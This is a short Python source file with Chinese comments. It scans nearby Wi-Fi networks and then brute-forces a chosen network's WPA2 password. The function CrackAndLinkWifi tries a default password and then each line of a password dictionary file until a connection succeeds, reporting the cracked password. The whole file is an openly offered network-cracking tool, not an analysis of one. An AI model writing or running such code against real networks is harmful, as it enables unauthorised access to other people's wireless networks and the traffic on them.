import pywifi
from PyQt5 import QtTest

# 定义未链接状态
DISCONNECTED_STATUS = [pywifi.const.IFACE_INACTIVE, pywifi.const.IFACE_DISCONNECTED]

iface = None

def ScanWifi():
    global iface
    wifi_results = []
    iface = pywifi.PyWiFi().interfaces()[0]    
    # 如果已经连接上无需再连
    if iface.status() not in DISCONNECTED_STATUS:
        return None, "您不是已经连上了吗！"
    # 扫描2秒周围的wifi
    iface.scan()
    print("开始扫描")
    # time.sleep(2) 
    # 使用qWait可以避免主窗口显示未响应
    QtTest.QTest.qWait(2000)
    print("扫描结束")
    for profile in iface.scan_results():
        wifi_results.append(profile.ssid.encode("raw_unicode_escape").decode("utf-8"))
    return wifi_results, None

def CrackAndLinkWifi(main_windowm, wifi_name, pswds=["4001001234"], dict_file=None):
    global iface
    # 没有设置密码字典就只能用默认密码
    profile = pywifi.Profile()
    profile.ssid = wifi_name 
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    for pswd in pswds:
        profile.key = pswd
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        main_windowm.statusbar.showMessage("开始尝试密码 "+ pswd)
        print("链接 密码 = ", pswd)
        main_windowm.statusbar
        # time.sleep(2)
        QtTest.QTest.qWait(2000)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            return "已经连接上" + wifi_name + " 密码：" + pswd
    if dict_file:
        with open(dict_file, "r") as fp:
            pswd = fp.readline()
            while pswd:  
                profile.key = pswd
                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                main_windowm.statusbar.showMessage("开始尝试密码 "+ pswd)
                print("链接 密码 = ", pswd)
                iface.connect(tmp_profile)
                # time.sleep(2)
                QtTest.QTest.qWait(2000)
                if iface.status() == pywifi.const.IFACE_CONNECTED:
                    return "已经连接上" + wifi_name + " 密码：" + pswd
                    break
                pswd = fp.readline()

    return "连不上，建议直接问"
